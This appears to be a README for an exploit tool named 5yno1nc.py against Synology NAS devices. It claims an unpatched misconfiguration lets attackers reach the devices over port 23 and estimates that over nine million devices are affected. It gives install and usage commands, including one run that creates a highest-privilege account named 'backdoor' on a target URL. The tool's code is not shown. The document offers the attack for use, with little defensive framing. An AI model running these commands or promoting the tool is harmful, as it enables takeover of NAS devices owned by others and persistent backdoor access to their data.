
# EXP-Synology-2026

Research conducted by Maptnh indicates that improper configuration of Synology NAS devices may result in the exposure of sensitive directories. Attackers can gain access to the target host via port 23 and create a highest-privilege backdoor account.

The estimated number of potentially affected devices is ≥ 9,192,715.

At the time of writing, no official patch has been released.  therefore, please use it with caution.

![alt text](./pic/image.png)

# Video
 
<a href="https://www.youtube.com/watch?v=mel8XqcLGWM">
  <img src="https://markdown-videos-api.jorgenkh.no/url?url=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3Dmel8XqcLGWM" width="100%">
</a>


# 5yno1nc Usage

`$ pip install requests pexpect`

`$ python3 5yno1nc.py --help`


![alt text](./pic/image-1.png)



# Create a privileged backdoor account

`$ python3 5yno1nc.py --url http://x.x.x.x:5000 --username backdoor --password ThisIsPass`


![alt text](./pic/image-2.png)


![alt text](./pic/image-3.png)



